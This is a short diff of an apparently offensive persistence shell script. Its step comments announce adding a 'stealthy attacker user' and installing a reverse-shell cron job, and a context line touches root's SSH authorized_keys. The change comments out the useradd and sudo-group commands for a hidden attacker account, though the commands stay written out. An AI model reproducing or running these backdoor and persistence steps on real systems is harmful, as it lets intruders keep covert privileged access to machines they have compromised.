@@ -18,9 +18,9 @@ chmod 600 /root/.ssh/authorized_keys
 
 # 4. Add stealthy attacker user
 echo "[*] Creating hidden attacker user"
-useradd attackeruser -m -s /bin/bash
+#useradd attackeruser -m -s /bin/bash
 # echo 'attackeruser:YourPassword' | chpasswd  
-usermod -aG sudo attackeruser
+#usermod -aG sudo attackeruser
 
 # 5. Set up cronjob for persistent reverse shell
 echo "[*] Installing reverse shell cronjob"
